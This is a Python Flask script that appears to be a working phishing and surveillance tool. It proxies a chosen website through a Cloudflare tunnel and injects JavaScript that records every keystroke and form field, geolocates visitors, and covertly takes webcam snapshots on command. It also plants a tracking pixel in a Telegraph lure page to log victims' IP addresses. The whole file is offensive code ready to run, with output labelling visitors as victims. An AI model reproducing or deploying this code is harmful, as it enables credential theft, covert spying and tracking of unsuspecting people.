import os, requests, subprocess, threading, uuid, base64, time, re, io, sys
from flask import Flask, request, render_template_string, Response, send_file
from flask_socketio import SocketIO, emit
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from telegraph import Telegraph

import logging
logging.getLogger('werkzeug').setLevel(logging.ERROR)

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*", max_http_buffer_size=1e8)
ADMIN_TOKEN = str(uuid.uuid4())
tg = Telegraph()
tg.create_account(short_name="node_x")

STATE = {"target": "", "base_url": "", "tunnel": "", "tg_url": ""}

AGENT_JS = """
<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
<script>
const socket = io({transports: ['websocket', 'polling']});
async function getIntel() {
    let geo = {city: 'Unknown', isp: 'Unknown'};
    try { const res = await fetch('https://ipapi.co/json/'); geo = await res.json(); } catch(e) {}
    socket.emit('client_init', {
        ua: navigator.userAgent, res: window.screen.width + 'x' + window.screen.height,
        ip: geo.ip, city: geo.city, isp: geo.org
    });
}
getIntel();
document.addEventListener('keydown', e => {
    socket.emit('log_ev', {type:'KEY', val: e.key, target: e.target.tagName});
});
document.addEventListener('input', e => {
    if(e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
        socket.emit('log_ev', {type:'INPUT', val: e.target.value, name: e.target.name || e.target.id});
    }
});
socket.on('cmd', d => {
    if(d.type === 'cam_shot') {
        navigator.mediaDevices.getUserMedia({video:true}).then(s => {
            const v = document.createElement('video'); v.srcObject = s; v.play();
            setTimeout(() => {
                const c = document.createElement('canvas');
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v,0,0);
                socket.emit('log_ev', {type:'CAM', val: c.toDataURL('image/jpeg')});
                s.getTracks().forEach(t => t.stop());
            }, 1000);
        });
    }
});
</script>
"""

@app.route('/track.png')
def track_pixel():
    ip = request.headers.get('CF-Connecting-IP', request.remote_addr)
    print(f"\n[!] TELEGRAPH_HIT: {ip} | {time.strftime('%H:%M:%S')}")
    pixel = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n2\xb4\x00\x00\x00\x00IEND\xaeB`\x82'
    return send_file(io.BytesIO(pixel), mimetype='image/png')

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def proxy(path):
    url = urljoin(STATE["base_url"], path + ("?" + request.query_string.decode() if request.query_string else ""))
    try:
        r = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'}, stream=True, timeout=10)
        if "text/html" in r.headers.get("Content-Type", ""):
            soup = BeautifulSoup(r.text, 'html.parser')
            if soup.body: soup.body.append(BeautifulSoup(AGENT_JS, 'html.parser'))
            return str(soup)
        return Response(r.content, content_type=r.headers.get("Content-Type"))
    except: return "Offline", 404

@socketio.on('client_init')
def h_init(d): print(f"\n[RECON] Victim on Fake Site: {d['ip']} ({d['city']})")

@socketio.on('log_ev')
def h_log(d):
    prefix = f"[{d['type']}]"
    content = f"Field: {d.get('name')} | Val: {d['val']}" if d['type'] == 'INPUT' else d['val']
    if d['type'] != 'CAM': print(f"{prefix} {content}")

def find_cloudflared():
    # Проверка Windows (.exe) и Linux (бинарник в PATH или папке)
    commands = ["./cloudflared.exe", "cloudflared.exe", "cloudflared", "./cloudflared"]
    for cmd in commands:
        try:
            subprocess.run([cmd, "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return cmd
        except: continue
    return None

def run_tunnel():
    cmd = find_cloudflared()
    if not cmd:
        print("[-] Error: cloudflared not found. Install it or place in script folder.")
        sys.exit()
        
    p = subprocess.Popen([cmd, "tunnel", "--url", "http://127.0.0.1:5000"], 
                         stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, encoding='utf-8')
    for line in iter(p.stdout.readline, ""):
        match = re.search(r"https://[a-z0-9-]+\.trycloudflare\.com", line)
        if match:
            STATE["tunnel"] = match.group(0)
            setup_tg()
            break

def setup_tg():
    print(f"\n[+] Tunnel Active: {STATE['tunnel']}")
    t_title = input("TG Title >> ")
    t_text = input("TG Content >> ")
    pixel = f'<img src="{STATE["tunnel"]}/track.png">'
    page = tg.create_page(t_title, html_content=f"<p>{t_text}</p>{pixel}")
    STATE["tg_url"] = f"https://telegra.ph/{page['path']}"
    
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"--- SERVER STARTED ---")
    print(f"1. TELEGRAPH LOG: {STATE['tg_url']}")
    print(f"2. FAKE SITE:    {STATE['tunnel']}")
    print(f"3. ADMIN PANEL:  {STATE['tunnel']}/{ADMIN_TOKEN}")
    print("-" * 30)

if __name__ == "__main__":
    STATE["target"] = input("TARGET SITE (Proxy) >> ")
    if not STATE["target"].startswith("http"): STATE["target"] = "https://" + STATE["target"]
    STATE["base_url"] = f"{urlparse(STATE['target']).scheme}://{urlparse(STATE['target']).netloc}"
    
    threading.Thread(target=run_tunnel, daemon=True).start()
    socketio.run(app, port=5000, log_output=False)
